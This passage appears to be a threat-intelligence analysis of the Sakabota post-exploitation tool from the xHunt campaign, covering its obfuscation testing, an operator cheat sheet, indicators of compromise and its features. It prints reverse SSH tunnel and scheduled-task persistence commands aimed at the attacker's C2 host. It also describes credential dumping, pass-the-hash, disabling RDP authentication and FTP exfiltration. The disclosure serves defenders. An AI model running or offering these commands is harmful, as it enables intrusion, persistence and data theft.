<p>The first round of testing started with the oldest known version of Sakabota, specifically 1.4.0.0, and resulted in a new version of 1.5.0.0. The second round of testing started with Sakabota 1.5.0.0 and resulted in a new version of 1.6.0.0. During the two rounds, the developer tested several different crypters and obfuscators, including “Confuser,” “ConfuserEx,” “CodeVeil,” and two different versions of “.NET Reactor.” Ultimately, in the second round of testing the developer determined that one of the “.NET Reactor” versions (possibly 4.8 or 4.9) resulted in the lowest detection rate, which prompted the developer to continue using this version of “.NET Reactor” for the remainder of the testing activities.</p>
<p>In addition to making changes to the code base and testing various obfuscators, the tester also made modifications to or removed resources embedded within the samples. The most interesting change to resources occurred in the first iteration of the July testing, where the developer modified the ‘k’ resource that was initially a text file that contained a cheat sheet for the actor to a blank document that contained nothing more than a byte order mark (U+FEFF).</p>
<h4>Sakabota Cheat Sheet</h4>
<p>During our analysis of the testing activities related to Sakabota, the oldest known sample (SHA256:<br />
<span style="font-family: 'courier new', courier, monospace;">5b5f6869d8e7e5746cc9bec58694e4e0049aef0dcac5dfd595322607ba10e1ae</span>) had an embedded resource named ‘k’. This resource contained text that at first glance appeared to be usage instructions for the tool, however, on further inspection it is a cheat sheet for the operators using Sakabota in how to perform a variety of activities once they have access to the targeted system and network. This cheat sheet gave us unprecedented insight into the tools and techniques the actor using Sakabota uses once they gained access to the compromised system. The cheat sheet also included domains and IP addresses within the example commands, which confirms our analysis that these network artifacts belong to this threat group’s infrastructure.</p>
<p>To access this cheat sheet, an operator would click the <span style="font-family: 'courier new', courier, monospace;">Knoldege</span> button within Sakabota’s GUI, which would display the cheat sheet in a scrolling text box immediately to the right of the button. Figure 1 shows the Sakabota GUI with the <span style="font-family: 'courier new', courier, monospace;">Knoldege</span> button clicked and the cheat sheet displayed in green text.</p>
<p><img class="wp-image-101776 aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-49.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-49.png 1640w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-49-300x124.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-49-1024x423.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-49-768x318.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-49-1536x635.png 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-49-900x372.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-49-370x153.png 370w" sizes="(max-width: 1640px) 100vw, 1640px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 1. Sakabota’s GUI displaying cheat sheet</em></span></p>
<p>The cheat sheet is separated into several sections, based on the purpose of the example commands. Fortunately, the commands listed in the cheat sheet provides us with a great deal of insight into some of the tools and techniques the actors will possibly use after compromising the end system. The cheat sheet shows significant batch and PowerShell scripting and a preference for using RDP, as well as the following tools not provided natively in Windows (i.e. <a href="https://github.com/vanhauser-thc/thc-hydra">thc-hydra</a>, Plink, Mimikatz, <a href="https://github.com/secabstraction/PowerCat">Powercat</a>, <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">ProcDump</a>, <a href="https://github.com/BloodHoundAD/SharpHound">SharpHound/BloodHound</a> and <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a>). Table 1 shows the headers and a description of each section within the cheat sheet.</p>
<table style="height: 708px; width: 0%;">
<tbody>
<tr style="height: 23px;">
<td style="width: 16.2994%; height: 23px;"><strong>Section Heading</strong></td>
<td style="width: 83.609%; height: 23px;"><strong>Description</strong></td>
</tr>
<tr style="height: 23px;">
<td style="width: 16.2994%; height: 23px;">Hydra</td>
<td style="width: 83.609%; height: 23px;">Provides an example command on how to run the thc-hydra tool to brute force an RDP login on a single IP address using text files with the username and password combinations.</td>
</tr>
<tr style="height: 23px;">
<td style="width: 16.2994%; height: 23px;">Pass The Hash</td>
<td style="width: 83.609%; height: 23px;">Provides two examples of arguments needed to pass-the-hash to run a command on a remote system using Mimikatz. The command in both examples use the psexec tool to run &#8216;cmd.exe&#8217; on the remote system.</td>
</tr>
<tr style="height: 23px;">
<td style="width: 16.2994%; height: 23px;">WMIC with Bat</td>
<td style="width: 83.609%; height: 23px;">Provides an example windows management interface command (WMIC) with arguments to run a batch script (&#8220;c:\temp\a.bat&#8221;) using the &#8216;process call create&#8217; with supplied username and password.</td>
</tr>
<tr style="height: 46px;">
<td style="width: 16.2994%; height: 46px;">Plink</td>
<td style="width: 83.609%; height: 46px;">Provides example command-line commands to use Plink (PuTTY Link) to create an SSH tunnel between a remote system and the local system to allow the actor to remotely access the compromised system via remote desktop (RDP). The command instructs Plink to connect to the remote system, in the two examples were &#8216;pasta58[.]com&#8217; and &#8216;176.9.235[.]101&#8217; over TCP port 25 and to authenticate to these remote systems using the username of &#8216;bor&#8217; and the password &#8216;123321&#8217;. The example commands use &#8216;svphost&#8217; as the application name, which is the same filename that Sakabota would use to install Plink to the system (&#8220;svphost.exe&#8221;).</td>
</tr>
<tr style="height: 23px;">
<td style="width: 16.2994%; height: 23px;">LSASS Process</td>
<td style="width: 83.609%; height: 23px;">Provides five example commands that use ProcDump, Mimikatz and PowerSploit&#8217;s Out-Minidump function to dump the &#8216;lsass.exe&#8217; process memory. Two of the command specifically dump the contents to a file located at &#8216;c:\mydump.dmp&#8217;, while another saves the memory to a file named &#8216;lsass.dmp&#8217;.</td>
</tr>
<tr style="height: 23px;">
<td style="width: 16.2994%; height: 23px;">WDigest</td>
<td style="width: 83.609%; height: 23px;">Provides the command line commands to use the &#8216;reg&#8217; application to query and modify the WDigest registry key &#8216;UseLogonCredential&#8217; that instructs Windows to store credentials in memory in cleartext or not. Setting this key to &#8216;0&#8217; is a suggested mitigation to Mimikatz credential dumping, which is likely why the cheat sheet provides the &#8216;reg&#8217; command to set this key to &#8216;1&#8217; to enable it.</td>
</tr>
<tr style="height: 46px;">
<td style="width: 16.2994%; height: 46px;">Powercat</td>
<td style="width: 83.609%; height: 46px;">Provides example commands for both the client and the server to create a remote shell and transfer files using the powercat PowerShell tool. The remote systems that the commands would connect to are &#8216;pasta58[.]com&#8217; and &#8216;213.202.217[.]31&#8217; over TCP port 443. This section also provides an example PowerShell command to download powercat from &#8216;hxxp://pasta58[.]com/pk.txt&#8217; and to save the result to &#8216;c:\users\public\pc.ps1&#8217; before creating a remote shell to &#8216;pasta58[.]com&#8217;.</td>
</tr>
<tr style="height: 23px;">
<td style="width: 16.2994%; height: 23px;">Ntds</td>
<td style="width: 83.609%; height: 23px;">Provides example commands to save the &#8216;Security Account Manager&#8217; (SAM) registry hive using the &#8216;reg&#8217; application and Mimikatz&#8217;s &#8216;lsadump::sam&#8217; command. This section of the cheat sheet also includes login credentials to &#8216;CMD5.org&#8217;, which we believe the actor would use to crack hashes extracted from the registry dump files.</td>
</tr>
<tr style="height: 23px;">
<td style="width: 16.2994%; height: 23px;">taskch</td>
<td style="width: 83.609%; height: 23px;">Provides example commands to delete, create and run scheduled tasks. The scheduled tasks in the examples have the names &#8216;WindowsUpdateTolkit&#8217; and &#8216;WindowsUpdateTolkit_1&#8217; and would run &#8216;SystemRecoverytolkit.ps1&#8217; and &#8216;TempSystemRecovery.vbs&#8217;, all but &#8216;WindowsUpdateTolkit_1&#8217; were used to create persistence for CASHY200 payloads in xHunt related attacks.</td>
</tr>
<tr style="height: 48px;">
<td style="width: 16.2994%; height: 48px;">Download from CMD</td>
<td style="width: 83.609%; height: 48px;">Provides a PowerShell command to download a file from &#8216;hxxp://pasta58[.]com/r.t&#8217; and save to &#8216;c:\windows\temp\temp\run.bat&#8217;.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 16.2994%; height: 24px;">FTP Powershell</td>
<td style="width: 83.609%; height: 24px;">Provides a PowerShell command that uploads a file &#8216;C:\users\public\P.txt&#8217; to &#8216;ftp://pasta58[.]com/P.txt&#8217; using the login username &#8216;admin&#8217; and &#8216;sak&#8217; as a password.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 16.2994%; height: 24px;">FTP From CMD</td>
<td style="width: 83.609%; height: 24px;">Provides command line commands using echo to create a file named &#8216;ftpcmd.dat&#8217; that contains the necessary commands to log into the FTP server at &#8216;pasta58[.]com&#8217; using &#8216;administrator&#8217; as the username and &#8216;QwErTyUiOp123456&#8217; as the password to upload a file named &#8216;TRR.txt&#8217;.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 16.2994%; height: 24px;">FireWall</td>
<td style="width: 83.609%; height: 24px;">Provides six example commands to add, delete and show rules from the local Windows Firewall using the &#8216;netsh&#8217; application. The example commands include the creation of rules to allow inbound network traffic to the Plink application saved to &#8216;svphost.exe&#8217; discussed in the Plink section, as well as inbound traffic over TCP port 22.</td>
</tr>
<tr style="height: 48px;">
<td style="width: 16.2994%; height: 48px;">RDP NLA</td>
<td style="width: 83.609%; height: 48px;">Provides a PowerShell command that disables Network Level Authentication (NLA) for RDP. The command uses WMI to call the &#8216;SetUserAuthenticationRequired&#8217; method to disable the &#8216;UserAuthenticationRequired&#8217; property in &#8216;Win32_TSGeneralSetting&#8217;. NLA requires the user to authenticate prior to the creation of an RDP session with a server, so we believe the actor would disable NLA to allow RDP sessions over the tunnel created with Plink.</td>
</tr>
<tr style="height: 48px;">
<td style="width: 16.2994%; height: 48px;">RDP Port</td>
<td style="width: 83.609%; height: 48px;">Provides example commands using the &#8216;reg&#8217; application to query and add values to keys in &#8216;hklm\system\currentControlSet\Control\Terminal Server&#8217;. The queries in the cheat sheet would allow the actor to view the port number that RDP uses and if the &#8216;AllowTSConnections&#8217; setting is enabled to allow RDP sessions. The cheat sheet also has two &#8216;reg&#8217; commands to add values to the registry keys &#8216;AllowTSConnections&#8217; and &#8216;fDenyTSConnections&#8217; to enable RDP sessions.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 16.2994%; height: 24px;">WinRAR</td>
<td style="width: 83.609%; height: 24px;">Provides WinRAR command line commands to recursively archive folders. One of the examples outputs multi-volume RAR archives split into 153,600KB files.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 16.2994%; height: 24px;">DB</td>
<td style="width: 83.609%; height: 24px;">Contains a variety of SQL queries related to navigating an unknown database. Based on the tables and column names, it appears that these queries attempt to extract customer information and call detail records (CDR), which is likely associated with telecommunications.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 16.2994%; height: 24px;">Get Users</td>
<td style="width: 83.609%; height: 24px;">Provides the commands to run the Local.exe and Dsquery.exe tools to gather user information from a specified remote system or domain.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 16.2994%; height: 24px;">Scan For</td>
<td style="width: 83.609%; height: 24px;">Provides three commands that use for loops to scan a local subnet (specifically a /24) to locate systems responding to ping requests, to check for file shares using the &#8216;net use&#8217; application with &#8216;administrator&#8217; as the username and &#8216;P@ssw0rd&#8217; as the password and to check for systems whose &#8216;C:&#8217; drive is shared using the &#8216;dir&#8217; command.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 16.2994%; height: 24px;">Route Print</td>
<td style="width: 83.609%; height: 24px;">This section was blank.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 16.2994%; height: 24px;">Scripting</td>
<td style="width: 83.609%; height: 24px;">Provides two &#8220;scripts&#8221;, one that reads locations from &#8216;c:\test.txt&#8217; that it will iterate through and use as the argument to the &#8216;ping&#8217; command, while the second pings &#8220;www.google.com&#8221; and checks the response for the string &#8220;Reply&#8221;.</td>
</tr>
<tr style="height: 24px;">
<td style="width: 16.2994%; height: 24px;">Base 64</td>
<td style="width: 83.609%; height: 24px;">Provides two commands that use the &#8216;certutil&#8217; application and the &#8216;-encode&#8217; and &#8216;-decode&#8217; to convert &#8216;test.exe&#8217; to &#8216;test.txt&#8217; and vice versa.</td>
</tr>
<tr style="height: 48px;">
<td style="width: 16.2994%; height: 48px;">Pantest</td>
<td style="width: 83.609%; height: 48px;">Includes some Google search operators that the actor could likely use to find web servers of interest. The search operators include &#8216;site&#8217; searches for &#8216;.sa&#8217;, &#8216;.kw&#8217;, &#8216;.ph&#8217; and &#8216;.ir&#8217;, &#8216;ext&#8217; for &#8216;asp&#8217;, &#8216;aspx&#8217;, &#8216;php&#8217; and &#8216;jsp&#8217;, &#8216;inurl&#8217; for &#8216;login&#8217; and &#8216;admin&#8217; and &#8216;intext&#8217; for &#8216;&#8212;&#8216;, &#8216;Mysql_num_rows&#8217; and &#8216;Apache/2.4.12 (Win32) OpenSSL/1.0.1m PHP/5.6.11&#8217;. The cheat sheet also provides several examples of SQL injection techniques with a ticular focus on XAMPP servers.</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 1. Sections within Sakabota’s cheat sheet and a description of their contents</em></span></p>
<p>While the cheat sheet does not include a specific header, it does include example commands explaining how to use PowerShell to run Sharphound, which is the C# variant of the Bloodhound tool. Bloodhound is an open-source tool used to discover relationships between objects in an Active Directory environment. Many red teamers use Bloodhound to determine attack paths from a controlled asset on the breached network to their objective. The specific arguments in the example command instruct Bloodhound to use the following collection methods:</p>
<ul>
<li>ACL &#8211; Collect ACL (Access Control List) data</li>
<li>ObjectProps &#8211; Collects node property information for users and computers</li>
<li>Default &#8211; Collects Group Membership, Local Admin, Sessions, and Domain Trusts</li>
</ul>
<p>The inclusion of these commands in the cheat sheet suggests that the actors would also leverage Bloodhound for the same reason a red teamer would: specifically mapping out attack paths once they gain access to the network. These attack paths allow the adversary to determine what systems and accounts they should focus their efforts on to eventually gain access to the systems and accounts needed to achieve their objectives.</p>
<p>The cheat sheet also included the following domain and IP addresses of interest in the example commands that we associate with the threat actor’s infrastructure:</p>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">pasta58[.]com</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">176.9.235[.]101</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">213.202.217[.]31</span></li>
</ul>
<p>The <span style="font-family: 'courier new', courier, monospace;">213.202.217[.]31</span> IP address resolved the domain <span style="font-family: 'courier new', courier, monospace;">dl.kcc.com[.]kw</span> that was used to host the delivery documents installing the CASHY200 payload in the July 2018 attacks <a href="https://unit42.paloaltonetworks.com/more-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection/">discussed in our previous blog on xHunt</a>. The<span style="font-family: 'courier new', courier, monospace;"> 176.9.235[.]101</span> IP address was resolved to by <span style="font-family: 'courier new', courier, monospace;">pasta58[.]com</span>, which is a known Sakabota C2 domain. We also observed this IP address and domain included as auto-complete entries within certain fields of Sakabota’s GUI (see <a href="#post-101775-_lx5gsk4pq6rd">Appendix</a>), of which also included the IP address <span style="font-family: 'courier new', courier, monospace;">23.227.207[.]233</span> also previously resolved to by <span style="font-family: 'courier new', courier, monospace;">pasta58[.]com</span>. While this does not provide any new infrastructure, it strengthens our linkages between these entities within the infrastructure and their association with the threat actors involved.</p>
<h1>Conclusion</h1>
<p>While researching the tools associated with the xHunt campaign, we discovered testing activities carried out by a developer that is associated with this attack campaign. During this testing activity, we found a sample of Sakabota that contained a cheat sheet for the operators that provided significant insight into the tools, tactics, and techniques likely associated with these threat actors. We occasionally see malware developers including usage instructions within their tools to help an operator understand how to use various functionalities within the tool, but we’ve never seen a malware developer include a cheat sheet of example commands to assist the operator in carrying out the activities on the compromised system and network. Not only did this cheat sheet give us unprecedented insight into the tools and commands they would likely execute on the system, but it also provided references to network locations within their infrastructure.</p>
<p>Palo Alto Networks customers are protected from the tools mentioned in this blog through the following:</p>
<ul style="list-style-type: circle;">
<li style="list-style-type: none;">
<ul>
<li style="font-weight: 400;"><span style="font-weight: 400;">Customers using AutoFocus can view this activity by using the </span><a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Sakabota"><span style="font-weight: 400;">Sakabota</span></a><span style="font-weight: 400;"> tag</span></li>
<li style="font-weight: 400;"><span style="font-weight: 400;">C2 domain </span><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">pasta58[.]com</span><span style="font-weight: 400;"> is classified as malicious in </span><a href="https://www.paloaltonetworks.com/products/threat-prevention-services"><span style="font-weight: 400;">Threat Prevention</span></a>, <a href="https://www.paloaltonetworks.com/products/threat-detection-and-prevention/dns-security">DNS Security</a><span style="font-weight: 400;"> and </span><a href="https://www.paloaltonetworks.com/products/threat-detection-and-prevention/web-security"><span style="font-weight: 400;">URL Filtering</span></a><span style="font-weight: 400;">.</span></li>
<li style="font-weight: 400;"><span style="font-weight: 400;">All Sakabota samples identified are detected as malicious by WildFire and Traps.</span></li>
</ul>
</li>
</ul>
<h1><a id="Appendix"></a>Appendix</h1>
<h2><a id="post-101775-_m9c3rlwfpsy4"></a>Indicators of Compromise</h2>
<h3><a id="post-101775-_ihboqmoxbc1k"></a>Sakabota Infrastructure</h3>
<p><span style="font-family: georgia, palatino, serif;">pasta58[.]com</span></p>
<p><span style="font-family: georgia, palatino, serif;">176.9.235[.]101</span></p>
<p><span style="font-family: georgia, palatino, serif;">213.202.217[.]31</span></p>
<p><span style="font-family: georgia, palatino, serif;">23.227.207[.]233</span></p>
<h3><a id="post-101775-_q37pcgo3l8tk"></a>Sakabota SHA256</h3>
<p>7cfd75ab4822b489f74e83d3046536509c44b29b72b43125b0eca1fe449b5953</p>
<p>5b5f6869d8e7e5746cc9bec58694e4e0049aef0dcac5dfd595322607ba10e1ae</p>
<p>335e9eb0bb571ca81cc6829483f0b8d015627f8301373756d04d844cde04918d</p>
<p>40b18a1c06888f8e116b6de21f70359b9763b8066c764542ff3816c118b7d482</p>
<p>8e18b28dc7351b0e7928b0f5373a6e987ba6d084d84bfd0b29e7f458ca5401e5</p>
<p>ea31e5afec3b94635e98473183ec420e9c3e6fd13b618dadb5b34bf5c257a5aa</p>
<p>66e57d2909e37d39791bee91eb9e8121aa48ea89eae8a09275ae078e9dda2f50</p>
<p>2d7ff8d3aee31cd2f384d74e6b0f07ecda2cea860fb3210c9afe66bc7cc6f90b</p>
<p>df0f874219ffac8038290eb4a39ba6686edc35de8913563f8ddc9644ad4bde64</p>
<p>d0f57e566c6b457d6e97dc02266d67d81ef561fba50a86e9f9fc889dc5167068</p>
<p>d80aeb4fb326af0bf1179c4fcf2ad01cf98ddab81f709e690bbd728c027064e9</p>
<p>cc21bc11d9aed226e9c511480e54bb1305cea086ab0b5e310de68228debdc80e</p>
<p>bf7a448ef2603cce5488d97474c913ba14c9550d03cc5e387fe31eb416dc0259</p>
<p>161cfe70ea0022ef7aefffba93b3958ab09d7df6e61cc88d1c27e4917f554de4</p>
<p>224539e69c184d75ac59378ecab7914bcbe360310bb82add395d59e9e11d1419</p>
<p>b9c56da9e911dc85b06f8dc9d1a486663af8f982511e1c3ad568e635e2323274</p>
<p>9a431838f2613454c5630a5f186f0aee240dfc5723bd6e1b586bb4118cc3aab7</p>
<p>db1f460f624a4c13c3004899c5d0a4c3668ba99bb1e6be7f594e965c637b6917</p>
<p>b73facbf55053519b5da29397cfd3beea519e9f1bd41c50b6c2f3f1b4eca15a3</p>
<p>761635c23f3c98a8d18e48c767fff2b0ec321b58064b404ea1b2b4a555913296</p>
<p>47ca763da840fdee68b97e8d53cbc56b3f90e4d6532f0b1501b90175b8fca24f</p>
<h2><a id="post-101775-_xk7wzz673b85"></a>Sakabota Tool</h2>
<p>The Sakabota Tool allows threat actors involved with the xHunt campaign the ability to carry out post-exploitation activities, such as performing network reconnaissance, dumping credentials and interacting with discovered systems. Like other tools seen in the xHunt campaign, an actor can use the Sakabota tool from the command line or by interacting with its graphical user interface (GUI). We will discuss Sakabota’s functionality available from the command line and GUI, as the offered functionality differs dramatically. While we did not observe this activity, we speculate that the actor would use the command line interface to do initial data gathering after compromising a system and would use it to create a tunnel to establish an RDP session. After connecting to the system via RDP, we believe the actor would then use Sakabota’s GUI to take advantage of its increased capabilities.</p>
<h3><a id="post-101775-_j87euwboz36d"></a>Command Line Functionality</h3>
<p>The actor can use Sakabota’s command-line interface by including any command-line arguments, otherwise, Sakabota will display its GUI instead of the command-line. The developer of Sakabota included usage instructions that actors can view by including the <span style="font-family: 'courier new', courier, monospace;">-hel</span>p switch, as seen in Figure 2.</p>
<p>&nbsp;</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/Figure-2.-Sakabota’s-command-line-interface-displaying-usage-instructions.png" rel="wpdevart_lightbox"><img class="aligncenter wp-image-101840 size-full" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/Figure-2.-Sakabota’s-command-line-interface-displaying-usage-instructions.png" alt="" width="677" height="342" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/Figure-2.-Sakabota’s-command-line-interface-displaying-usage-instructions.png 677w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/Figure-2.-Sakabota’s-command-line-interface-displaying-usage-instructions-300x152.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/Figure-2.-Sakabota’s-command-line-interface-displaying-usage-instructions-370x187.png 370w" sizes="(max-width: 677px) 100vw, 677px" /></a></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 2. Sakabota’s command-line interface displaying usage instructions</em></span></p>
<p>The<span style="font-family: 'courier new', courier, monospace;"> -Up</span> command will upload a file or a folder’s files to the hardcoded C2 location of <span style="font-family: 'courier new', courier, monospace;">ftp://www.pasta58[.]com/&lt;filename&gt;</span> using the FTP protocol and a username and password of <span style="font-family: 'courier new', courier, monospace;">Administrator</span> and <span style="font-family: 'courier new', courier, monospace;">Mono8&amp;^Uj</span>.</p>
<p>The<span style="font-family: 'courier new', courier, monospace;"> -Tanbo</span> command writes an embedded NirCmd application by NirSoft to<span style="font-family: 'courier new', courier, monospace;"> SC.exe</span> in the current directory and uses this tool to take a screenshot of the system. The command will save the screenshot to the current directory named <span style="font-family: 'courier new', courier, monospace;">Screen_&lt;computer name&gt;_&lt;username&gt;.png</span><span style="font-family: georgia, palatino, serif;">.</span> The <span style="font-family: 'courier new', courier, monospace;">-Tanbo-up</span> command performs the same screenshot activity, but will upload the file to the C2 using FTP and the same credentials as the <span style="font-family: 'courier new', courier, monospace;">-Up</span> command and delete the screenshot file from the system.</p>
<p>The <span style="font-family: 'courier new', courier, monospace;">-Shuriken</span> and<span style="font-family: 'courier new', courier, monospace;"> -Shuriken-v</span> commands allow the actor to scan a remote system at<span style="font-family: 'courier new', courier, monospace;"> 23.227.207[.]233</span> for open TCP ports, likely to determine the TCP ports allowed outbound from a stateful firewall. The <span style="font-family: georgia, palatino, serif;">‘-Shuriken’</span> command will scan a list of TCP ports, specifically 123, 443, 80, 81, 23, 21, 22, 20, 110 and 25, while the <span style="font-family: 'courier new', courier, monospace;">-Shuriken-v</span> command allows the actor to specify the TCP port to scan. The IP address <span style="font-family: 'courier new', courier, monospace;">23.227.207[.]233</span> resolved to<span style="font-family: 'courier new', courier, monospace;"> pasta58[.]com</span>, which is the C2 domain used by this Sakabota sample.</p>
<p>The <span style="font-family: 'courier new', courier, monospace;">-Rev</span> command saves an embedded PuTTY Link tool, also known as Plink to <span style="font-family: 'courier new', courier, monospace;">c:\users\public\svphost.ex</span>e and uses this tool and the following command-line arguments to create an SSH tunnel to allow the actor to create a remote RDP session on the system:</p>
<p><span style="font-family: 'courier new', courier, monospace;">svphost pasta58[.]com</span> <span style="font-family: 'courier new', courier, monospace;">-C -R 0.0.0.0:1991:127.0.0.1:3389 -l bor -pw 123321 -P &lt;TCP port provided on command line&gt;</span></p>
<p>The &#8211;<span style="font-family: 'courier new', courier, monospace;">Rev-loop</span> command attempts to continually create an SSH tunnel to create a remote RDP session every ten minutes by creating a scheduled task named <span style="font-family: 'courier new', courier, monospace;">update.windows</span> with the following command:</p>
<p><span style="font-family: 'courier new', courier, monospace;">schtasks /create /sc minute /mo 10 /f /tr &#8220;cmd /c cd c:\users\public &amp; echo y | svphost pasta58.com -C -R 0.0.0.0:1991:127.0.0.1:3389 -l bor -pw 123321 -P &lt;TCP port provided on command line&gt;&#8221; /tn update.windows /ru SYSTEM&#8221;</span></p>
<h3><a id="post-101775-_nhloic781sja"></a>GUI Functionality</h3>
<p>The Sakabota tool has more functionality available to the actor from its GUI. The developers of Sakabota wanted to restrict others from using their tool, so they added a password screen that requires the individual to enter a password before being able to use the functionality provided by Sakabota’s GUI. Figure 3 shows Sakabota’s password dialog, which has the title <span style="font-family: 'courier new', courier, monospace;">Snapping Tool</span> and requires a password of 92, both of which are the same as the <a href="https://unit42.paloaltonetworks.com/xhunt-campaign-attacks-on-kuwait-shipping-and-transportation-organizations/">Gon tool discussed in the Appendix of our initial xHunt blog</a>.</p>
<p><img class="aligncenter wp-image-101780" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-51.png" alt="" width="600" height="512" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-51.png 370w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-51-300x256.png 300w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 3. Password screen displayed when opening the Sakabota GUI</em></span></p>
<p>After entering the correct password, Sakbota displays its main interface, as seen in Figure 4. Sakabota’s main interface has a window title that begins with the string “<span style="font-family: 'courier new', courier, monospace;">Sakabota &#8212;&gt;</span>“ followed by system information, which includes the domain name, computer name, username, and if the system has Internet access. Much like the password screen, the window title is very similar in structure to the <a href="https://unit42.paloaltonetworks.com/xhunt-campaign-attacks-on-kuwait-shipping-and-transportation-organizations/">Gon tool</a>, with the Gon tool’s window title starting with the string “<span style="font-family: 'courier new', courier, monospace;">xHunter &#8212;&gt;</span>” and Sakabota including the boolean for Internet connectivity.</p>
<p><img class="wp-image-101782 aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-52.png" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-52.png 819w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-52-300x125.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-52-768x320.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/12/word-image-52-370x154.png 370w" sizes="(max-width: 819px) 100vw, 819px" /></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 4. Sakabota’s main interface</em></span></p>
<p>Sakabota’s main interface has a tabular design, with each tab containing different functionality. Common amongst all the tabs is the bottom portion of the interface, which has several buttons and additional system information, such as the system’s local IP address and the IP address for its DNS server, as well as the usernames currently logged into the system. This area also has several buttons that the actor can use to perform clean-up and self-destruct actions, as well as apply some generic settings. Table 2 provides a list of the buttons and a description of their functionality.</p>
<table style="height: 296px; width: 100%;">
<tbody>
<tr>
<td style="width: 17.3163%;"><strong>Button</strong></td>
<td style="width: 82.4077%;"><strong>Description</strong></td>
</tr>
<tr>
<td style="width: 17.3163%;">Clear Tracks</td>
<td style="width: 82.4077%;">Cleans up actors activities by deleting registry keys used to store recent systems connected to via RDP (&#8220;Software\Microsoft\Terminal Server Client\Default&#8221;), recent applications run (&#8220;Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU&#8221;), recent typed paths in Windows Explorer (&#8220;SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\TYPEDPATHS&#8221;) and recent search terms (&#8220;SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery&#8221;).</td>
</tr>
<tr>
<td style="width: 17.3163%;">RDP SC</td>
<td style="width: 82.4077%;">Enables CredSSP for RDP sessions to use the current credentials to authenticate to the remote system by writing enablecredsspsupport:i:0 to the Default.rdp file.</td>
</tr>
<tr>
<td style="width: 17.3163%;">R</td>
<td style="width: 82.4077%;">Opens an explorer window with the results directory for scans and other commands.</td>
</tr>
<tr>
<td style="width: 17.3163%;">Knoldege</td>
<td style="width: 82.4077%;">Displays a cheat sheet for the actor in text box directly next to the button.</td>
</tr>
<tr>
<td style="width: 17.3163%;">#</td>
<td style="width: 82.4077%;">Enables/disables option called Personal Use that enables/disables an inactivity timer that Sakabota uses to hide its user interface to avoid detection.</td>
</tr>
<tr>
<td style="width: 17.3163%;">@</td>
<td style="width: 82.4077%;">Enables the RDP interrupt functionality that will close Sakabota and clean up the actors by running the same function as the Clear Tracks button, but also deletes the folder used to store command results and the Sakabota tool itself.</td>
</tr>
<tr>
<td style="width: 17.3163%;">(</td>
<td style="width: 82.4077%;">Enables and disables Silent Mode, which if enabled will ask the user if they would like to save scanning results to a file in addition.</td>
</tr>
<tr>
<td style="width: 17.3163%;">Hara-K</td>
<td style="width: 82.4077%;">Self-destruct mechanism, which will delete the Sakabota executable before exiting. Abbreviated ‘Harakiri’, which is a term for suicide in Japanese.</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 2. Buttons at the bottom of Sakabota’s main interface</em></span></p>
<p>The ‘Info’ tab seen in Figure 4 has several capabilities specifically focused on gathering information from systems on the network. This tab allows the actor to use an embedded ‘dsquery’ tool (SHA256:<br />
<span style="font-family: 'courier new', courier, monospace;">4c8c4e574b9d1dc05257a5c17203570ff6384d031c6e6284fbc0020fe63b719e</span>)<br />
to query Active Directory to gather information on computers, user and groups attached to the domain. This tab also allows the actor to scan IP addresses for specific services such as RDP, SMB, FTP, HTTP(s), telnet, and SSH. This tab also allows the actor to perform TCP port scan for systems on specified network ranges and connect to remote systems using the <span style="font-family: 'courier new', courier, monospace;">net use</span> command. Lastly, the actor can install a legitimate Microsoft tool called Local.exe (SHA256: <span style="font-family: 'courier new', courier, monospace;">450ebd66ba67bb46bf18d122823ff07ef4a7b11afe63b6f269aec9236a1790cd</span>) and use this tool to list the administrator accounts on a specified IP address on the local network.</p>
